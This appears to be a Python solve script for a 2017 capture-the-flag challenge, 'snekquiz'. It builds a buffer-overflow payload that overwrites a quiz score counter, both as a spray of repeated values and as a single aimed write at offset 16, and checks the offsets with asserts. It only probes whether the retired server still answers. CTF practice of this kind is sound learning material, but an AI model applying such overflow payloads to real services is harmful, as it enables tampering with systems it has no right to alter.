#!/usr/bin/env python3
"""
snekquiz. Blind stack overwrite of a score counter. No binary was ever handed
out and challenge.uiuc.tf:11343 is gone, so this only builds the payload and
checks the arithmetic behind it.
```
python3 solve.py
```
"""

import socket
import struct
import sys

HOST, PORT = "challenge.uiuc.tf", 11343

# 88 bytes was the longest answer the server accepted before the canary died.
MAX_ANSWER = 88

# The score counter sits 16 bytes past the start of the answer buffer. That
# offset comes from the Harekaze writeup, which sent a cyclic pattern and read
# the offset back out of the "you must be cheating" message.
SCORE_OFFSET = 16


def spray():
    """What we sent in 2017: 22 copies of a little-endian 5."""
    return struct.pack("<I", 5) * (MAX_ANSWER // 4)


def aimed():
    """The single write the spray was covering for."""
    return b"A" * SCORE_OFFSET + struct.pack("<I", 5)


def main():
    payload = spray()
    print(f"spray  {len(payload)} bytes, {payload!r}")
    print(f"aimed  {len(aimed())} bytes, {aimed()!r}")

    # A repeating 4-byte pattern writes 5 to every aligned dword it covers, so
    # the spray hits offset 16 without anyone having to know it was offset 16.
    assert len(payload) % 4 == 0
    covered = [i for i in range(0, len(payload), 4)
               if payload[i:i + 4] == struct.pack("<I", 5)]
    print(f"spray sets a 5 at aligned offsets {covered[0]} to {covered[-1]}, "
          f"{len(covered)} of them")
    assert SCORE_OFFSET in covered

    # 0x41414141 is what the server reported back when it was fed only "A"s,
    # which is how the counter was shown to be a 32-bit int.
    print(f"0x41414141 reads as {struct.unpack('<i', b'AAAA')[0]} signed")
    assert struct.unpack("<i", b"AAAA")[0] == 1094795585

    try:
        socket.create_connection((HOST, PORT), timeout=5).close()
    except OSError as e:
        print(f"{HOST}:{PORT} is down, as expected: {e}")
        return 0
    print("the service answered, which would be a surprise in 2026")
    return 0


if __name__ == "__main__":
    sys.exit(main())
